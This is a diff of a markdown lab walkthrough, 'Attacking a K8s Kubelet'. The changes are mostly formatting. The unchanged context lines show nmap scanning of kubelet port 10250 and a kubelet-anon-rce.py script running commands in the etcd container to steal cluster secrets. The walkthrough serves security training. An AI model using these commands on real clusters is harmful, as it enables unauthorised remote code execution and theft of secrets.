@@ -1,8 +1,10 @@
 # **Attacking a K8s Kubelet**
 
-### * *
+---
 
--------
+#### **Lab Image : Kubernetes**
+
+---
 
 #### Step 1:
 
@@ -24,7 +26,7 @@ kubectl -n secret get secrets
 
 ### *Our objective is to compromise the `kubelet`, and steal all configs and secrets by gaining access to `etcd`.*
 
--------
+---
 
 #### Step 2:
 
@@ -41,7 +43,7 @@ serverip
 nmap <IP> -sV -p 10250
 ```
 
--------
+---
 
 #### Step 3:
 
@@ -67,7 +69,7 @@ python3 kubelet-anon-rce.py --target <serverip> --port 10250 --namespace kube-sy
 python3 kubelet-anon-rce.py --target <serverip> --port 10250 --namespace kube-system --pod etcd-xxxxxxxxxxx --container etcd --exec "ls /var/lib/etcd/member/wal/"
 ```
 
--------
+---
 
 #### Step 4:
 
@@ -81,7 +83,7 @@ python3 kubelet-anon-rce.py --target <serverip> --port 10250 --namespace kube-sy
 
 ### *It can be observed that all data is stored in plain text!!*
 
--------
+---
 
 #### Step 5:
 
@@ -91,7 +93,7 @@ python3 kubelet-anon-rce.py --target <serverip> --port 10250 --namespace kube-sy
 kubectl delete ns secret
 ```
 
----------
+---
 
 ### Reading Material/References:
 
